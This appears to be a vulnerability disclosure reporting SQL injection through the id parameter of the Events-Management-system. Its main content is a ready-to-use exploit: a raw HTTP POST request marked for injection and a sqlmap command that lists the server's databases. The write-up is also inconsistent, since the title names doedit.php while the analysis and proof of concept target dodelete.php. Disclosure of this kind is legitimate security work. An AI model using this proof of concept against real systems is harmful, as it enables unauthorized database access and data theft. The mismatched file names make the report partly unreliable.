# Events-Management-system has sql injection vulnerability via doedit.php id parameter

## supplier
https://download.code-projects.org/details/25781c48-4c9f-495e-a56f-fd8b78652542
## Vulnerability file
doedit.php and id parameter
## describe
There are unrestricted SQL injection attacks in the Events-Management-system. Controllable parameters: id. In doedit.php, there is no restriction on adding id parameters to SQL statements. You can obtain sensitive information from the database.
## code analysis
The id parameters of the dodelete.php are not filtered and concatenated into the SQL statement for execution when attacker is not logining.

![image-20241103230630019](https://github.com/user-attachments/assets/2f0f16cc-a77a-4b76-a495-34a5031cae7a)



## POC

```
POST /dodelete.php HTTP/1.1
Host: events-management-system-master
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Origin: http://events-management-system-master
Connection: close
Referer: http://events-management-system-master/delete.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

id=1*
```

save as 2.txt

execute this command.

```
python sqlmap.py -r 2.txt  --level 3 --risk 2 --dbs
```

Get the database name: healthcare

![image-20241103231348595](https://github.com/user-attachments/assets/6255c54a-0617-471a-997b-3c9481c3cfa0)

![image-20241103231338743](https://github.com/user-attachments/assets/c5c14b93-cdd7-47be-b65f-913e1ba78f5e)

